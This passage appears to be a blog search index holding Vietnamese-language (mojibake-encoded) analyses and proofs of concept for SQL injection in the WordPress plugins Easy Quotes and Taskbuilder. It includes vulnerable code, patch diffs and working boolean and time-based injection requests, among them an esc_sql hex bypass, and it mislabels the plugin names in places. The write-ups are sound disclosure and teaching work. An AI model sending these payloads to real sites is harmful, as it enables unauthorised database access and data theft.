giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } Báº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u 